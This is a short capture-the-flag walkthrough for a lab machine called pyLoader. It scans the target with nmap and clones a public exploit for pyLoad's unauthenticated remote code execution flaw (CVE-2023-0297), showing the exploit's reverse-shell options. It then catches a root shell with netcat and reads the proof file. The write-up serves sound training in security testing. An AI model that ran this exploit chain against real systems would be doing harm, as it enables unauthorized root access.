# pyLoader

### Scan ports with nmap
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.125.26:9666/
|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
```

find the exploit for **Cheroot 8.6.0** 
```                                          
┌──(kali㉿kali)-[~/Desktop/PG/pyLoader]
└─$ git clone https://github.com/JacobEbben/CVE-2023-0297.git
Cloning into 'CVE-2023-0297'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 10 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 4.13 KiB | 4.13 MiB/s, done.
Resolving deltas: 100% (2/2), done.
                                                                    
┌──(kali㉿kali)-[~/Desktop/PG/pyLoader]
└─$ cd CVE-2023-0297 
        
┌──(kali㉿kali)-[~/Desktop/PG/pyLoader/CVE-2023-0297]
└─$ ls
exploit.py  LICENSE  README.md
        
┌──(kali㉿kali)-[~/Desktop/PG/pyLoader/CVE-2023-0297]
└─$ python3 exploit.py --help
usage: exploit.py [-h] -t TARGET [-c COMMAND] [-I ATK_IP] [-P ATK_PORT]
                  [-x PROXY]

PyLoad - Unauthenticated Remote Code Execution

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        url of the vulnerable site (Example:
                        "http://127.0.0.1:8000/" or
                        "https://pyload.example.xyz/py/")
  -c COMMAND, --command COMMAND
                        bash command to execute for single command mode
                        (Default: Disabled)
  -I ATK_IP, --atk-ip ATK_IP
                        ip address for automatic reverse shell (Default:
                        Disabled)
  -P ATK_PORT, --atk-port ATK_PORT
                        port for automatic reverse shell (Default:
                        Disabled)
  -x PROXY, --proxy PROXY
                        http proxy address (Example:
                        http://127.0.0.1:8080/)
```

get the reverse shell and get `proof.txt`
```
┌──(kali㉿kali)-[~/Desktop/PG/pyLoader/penelope]
└─$ nc -nvlp 4444        
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.125.26] 54550
bash: cannot set terminal process group (901): Inappropriate ioctl for devie
bash: no job control in this shell
root@pyloader:~/.pyload/data# ls
ls
db.version
pyload.db
root@pyloader:~/.pyload/data# cat /root/proof.txt
cat /root/proof.txt
a7a67384df09e06f172097fe435da653
root@pyloader:~/.pyload/data# 
```